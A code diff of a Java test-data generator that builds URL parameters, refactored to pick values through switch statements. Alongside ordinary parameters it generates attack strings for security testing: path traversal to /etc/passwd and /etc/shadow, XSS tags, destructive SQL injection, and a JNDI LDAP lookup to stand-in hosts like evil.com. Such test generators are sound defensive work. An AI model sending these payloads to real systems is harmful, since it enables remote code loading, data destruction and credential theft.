@@ -37,21 +37,23 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
 
     // Core generation parameters
     private final TypedGenerator<Integer> paramTypeGenerator = Generators.integers(0, 3);
-    private final TypedGenerator<String> parameterCategories = Generators.fixedValues("page", "size", "sort", "filter");
-    private final TypedGenerator<String> searchCategories = Generators.fixedValues("search", "category", "type", "status");
-    private final TypedGenerator<String> dataCategories = Generators.fixedValues("id", "limit", "offset", "format");
-    private final TypedGenerator<String> localeCategories = Generators.fixedValues("lang", "version", "timestamp");
-    private final TypedGenerator<String> booleanValues = Generators.fixedValues("true", "false");
-    private final TypedGenerator<String> sortValues = Generators.fixedValues("asc", "desc");
-    private final TypedGenerator<String> formatValues = Generators.fixedValues("json", "xml", "csv", "html");
-    private final TypedGenerator<String> languageValues = Generators.fixedValues("en", "de", "fr", "es", "ja");
-    private final TypedGenerator<String> statusValues = Generators.fixedValues("active", "inactive", "pending", "deleted");
-    private final TypedGenerator<String> systemPaths = Generators.fixedValues("etc/passwd", "windows/win.ini", "root");
-    private final TypedGenerator<String> scriptTags = Generators.fixedValues("script", "img", "iframe", "style");
-    private final TypedGenerator<String> sqlCommands = Generators.fixedValues("DROP TABLE", "DELETE FROM", "INSERT INTO");
-    private final TypedGenerator<String> tableNames = Generators.fixedValues("users", "admin", "accounts", "sessions");
-    private final TypedGenerator<String> maliciousDomains = Generators.fixedValues("evil.com", "attacker.net", "malicious.org");
-    private final TypedGenerator<String> protocolSchemes = Generators.fixedValues("javascript", "file", "data");
+    // QI-6: Dynamic generation components
+    private final TypedGenerator<Integer> parameterCategorySelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> searchCategorySelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> dataCategorySelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> localeCategorySelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> booleanSelector = Generators.integers(1, 2);
+    private final TypedGenerator<Integer> sortValueSelector = Generators.integers(1, 2);
+    private final TypedGenerator<Integer> formatValueSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> languageValueSelector = Generators.integers(1, 5);
+    private final TypedGenerator<Integer> statusValueSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> systemPathSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> scriptTagSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> sqlCommandSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> tableNameSelector = Generators.integers(1, 4);
+    private final TypedGenerator<Integer> maliciousDomainSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> protocolSchemeSelector = Generators.integers(1, 3);
+    private final TypedGenerator<Integer> xssPayloadSelector = Generators.integers(1, 3);
     private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
     private final TypedGenerator<Integer> numberValues = Generators.integers(1, 1000);
     private final TypedGenerator<Integer> mediumStringSize = Generators.integers(10, 30);
@@ -86,11 +88,11 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
     private String generateStandardParameterName() {
         int nameType = Generators.integers(0, 3).next();
         return switch (nameType) {
-            case 0 -> parameterCategories.next();
-            case 1 -> searchCategories.next();
-            case 2 -> dataCategories.next();
-            case 3 -> localeCategories.next();
-            default -> parameterCategories.next();
+            case 0 -> generateParameterCategory();
+            case 1 -> generateSearchCategory();
+            case 2 -> generateDataCategory();
+            case 3 -> generateLocaleCategory();
+            default -> generateParameterCategory();
         };
     }
 
@@ -185,23 +187,50 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
     }
 
     private String generateBooleanValue() {
-        return booleanValues.next();
+        return switch (booleanSelector.next()) {
+            case 1 -> "true";
+            case 2 -> "false";
+            default -> "true";
+        };
     }
 
     private String generateSortValue() {
-        return sortValues.next();
+        return switch (sortValueSelector.next()) {
+            case 1 -> "asc";
+            case 2 -> "desc";
+            default -> "asc";
+        };
     }
 
     private String generateFormatValue() {
-        return formatValues.next();
+        return switch (formatValueSelector.next()) {
+            case 1 -> "json";
+            case 2 -> "xml";
+            case 3 -> "csv";
+            case 4 -> "html";
+            default -> "json";
+        };
     }
 
     private String generateLanguageValue() {
-        return languageValues.next();
+        return switch (languageValueSelector.next()) {
+            case 1 -> "en";
+            case 2 -> "de";
+            case 3 -> "fr";
+            case 4 -> "es";
+            case 5 -> "ja";
+            default -> "en";
+        };
     }
 
     private String generateStatusValue() {
-        return statusValues.next();
+        return switch (statusValueSelector.next()) {
+            case 1 -> "active";
+            case 2 -> "inactive";
+            case 3 -> "pending";
+            case 4 -> "deleted";
+            default -> "active";
+        };
     }
 
     private String generateTestValue() {
@@ -231,19 +260,19 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
         for (int i = 0; i < depth; i++) {
             path.append("../");
         }
-        path.append(systemPaths.next());
+        path.append(generateSystemPath());
         return path.toString();
     }
 
     private String generateXSSAttack() {
-        String tag = scriptTags.next();
-        String payload = Generators.fixedValues("alert('xss')", "alert(1)", "prompt(1)").next();
+        String tag = generateScriptTag();
+        String payload = generateXssPayload();
         return "<" + tag + ">" + payload + "</" + tag + ">";
     }
 
     private String generateSQLInjectionAttack() {
-        String command = sqlCommands.next();
-        String table = tableNames.next();
+        String command = generateSqlCommand();
+        String table = generateTableName();
         return "'; " + command + " " + table + "; --";
     }
 
@@ -257,12 +286,12 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
     }
 
     private String generateJNDIAttack() {
-        String domain = maliciousDomains.next();
+        String domain = generateMaliciousDomain();
         return "${jndi:ldap://" + domain + "/}";
     }
 
     private String generateProtocolAttack() {
-        String protocol = protocolSchemes.next();
+        String protocol = generateProtocolScheme();
         String payload = switch (protocol) {
             case "javascript" -> "alert(1)";
             case "file" -> "///etc/passwd";
@@ -285,6 +314,112 @@ public class URLParameterGenerator implements TypedGenerator<URLParameter> {
     private String generateFilePathAttack() {
         String[] paths = {"../../../root", "..\\..\\windows\\system32", "/etc/shadow"};
         return paths[Generators.integers(0, paths.length - 1).next()];
+    }
+
+    // QI-6: Dynamic generation helper methods
+    private String generateParameterCategory() {
+        return switch (parameterCategorySelector.next()) {
+            case 1 -> "page";
+            case 2 -> "size";
+            case 3 -> "sort";
+            case 4 -> "filter";
+            default -> "page";
+        };
+    }
+
+    private String generateSearchCategory() {
+        return switch (searchCategorySelector.next()) {
+            case 1 -> "search";
+            case 2 -> "category";
+            case 3 -> "type";
+            case 4 -> "status";
+            default -> "search";
+        };
+    }
+
+    private String generateDataCategory() {
+        return switch (dataCategorySelector.next()) {
+            case 1 -> "id";
+            case 2 -> "limit";
+            case 3 -> "offset";
+            case 4 -> "format";
+            default -> "id";
+        };
+    }
+
+    private String generateLocaleCategory() {
+        return switch (localeCategorySelector.next()) {
+            case 1 -> "lang";
+            case 2 -> "version";
+            case 3 -> "timestamp";
+            default -> "lang";
+        };
+    }
+
+
+    private String generateSystemPath() {
+        return switch (systemPathSelector.next()) {
+            case 1 -> "etc/passwd";
+            case 2 -> "windows/win.ini";
+            case 3 -> "root";
+            default -> "etc/passwd";
+        };
+    }
+
+    private String generateScriptTag() {
+        return switch (scriptTagSelector.next()) {
+            case 1 -> "script";
+            case 2 -> "img";
+            case 3 -> "iframe";
+            case 4 -> "style";
+            default -> "script";
+        };
+    }
+
+    private String generateSqlCommand() {
+        return switch (sqlCommandSelector.next()) {
+            case 1 -> "DROP TABLE";
+            case 2 -> "DELETE FROM";
+            case 3 -> "INSERT INTO";
+            default -> "DROP TABLE";
+        };
+    }
+
+    private String generateTableName() {
+        return switch (tableNameSelector.next()) {
+            case 1 -> "users";
+            case 2 -> "admin";
+            case 3 -> "accounts";
+            case 4 -> "sessions";
+            default -> "users";
+        };
+    }
+
+    private String generateMaliciousDomain() {
+        return switch (maliciousDomainSelector.next()) {
+            case 1 -> "evil.com";
+            case 2 -> "attacker.net";
+            case 3 -> "malicious.org";
+            default -> "evil.com";
+        };
+    }
+
+    private String generateProtocolScheme() {
+        return switch (protocolSchemeSelector.next()) {
+            case 1 -> "javascript";
+            case 2 -> "file";
+            case 3 -> "data";
+            default -> "javascript";
+        };
+    }
+
+    private String generateXssPayload() {
+        return switch (xssPayloadSelector.next()) {
+            case 1 -> "alert('xss')";
+            case 2 -> "alert(1)";
+            case 3 -> "prompt(1)";
+            default -> "alert('xss')";
+        };
     }
 
     @Override
